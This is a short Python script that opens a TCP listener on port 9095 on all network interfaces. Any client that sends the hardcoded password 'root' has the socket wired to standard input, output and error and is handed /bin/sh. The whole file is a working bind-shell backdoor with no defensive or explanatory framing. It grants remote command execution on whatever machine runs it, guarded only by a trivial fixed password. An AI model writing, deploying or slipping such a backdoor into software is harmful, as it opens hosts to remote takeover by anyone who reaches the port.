import os
import socket
import sys


def main():
    # IP address of the server
    host = "0.0.0.0"  # Escucha en todas las interfaces de red disponibles

    # Port number of the server
    port = 9095

    print(f"Connecting to {host}:{port} ...")

    # Create a TCP server socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        tcp_socket.bind((host, port))
        tcp_socket.listen(1)
        print(f"Server listening on {host}:{port}...")

        while True:
            (client, address) = tcp_socket.accept()
            print(f"Connection from {address}")

            client.send("Hola Mundo\n".encode())

            # Receive data from client
            try:
                response = client.recv(1024).decode().strip()
                print(f"Response: {response}")

                if response == "root":
                    print("Access granted. Executing shell...")
                    for f in range(3):
                        os.dup2(client.fileno(), f)
                    os.execl("/bin/sh", "/bin/sh")
                else:
                    print("Invalid response. Closing connection.")
                    client.send("Access denied.\n".encode())
            except Exception as e:
                print(f"Error receiving data: {e}")
            finally:
                client.close()

    except Exception as e:
        print(f"Server error: {e}")
    finally:
        tcp_socket.close()
        print("Server shut down.")


if __name__ == '__main__':
    main()
